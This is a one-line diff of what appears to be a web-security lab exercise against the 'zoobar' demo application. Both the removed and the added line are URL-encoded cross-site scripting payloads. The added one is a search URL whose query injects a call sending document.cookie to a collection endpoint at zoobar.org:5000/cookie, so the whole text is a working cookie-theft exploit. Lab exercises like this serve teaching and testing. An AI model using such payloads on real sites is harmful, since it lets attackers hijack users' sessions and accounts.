@@ -1,1 +1,1 @@
-"%3Cdiv%20id%3D%22%23userName%22%20style%3D%22display%3A%20none%3B%22%3E%3C%2Fdiv%3E%3Cscript%20type%3D%22text%2Fjavascript%22%3E%24.get('http%3A%2F%2Fzoobar.org%3A5000%2Fcookie%3Fcookie%3D'%2BencodeURIComponent(document.cookie))%3B%3C%2Fscript%3E"
+http://zoobar.org:5000/search?q=%22%24.get('http%3A%2F%2Fzoobar.org%3A5000%2Fcookie%3Fcookie%3D'%2BencodeURIComponent(document.cookie))
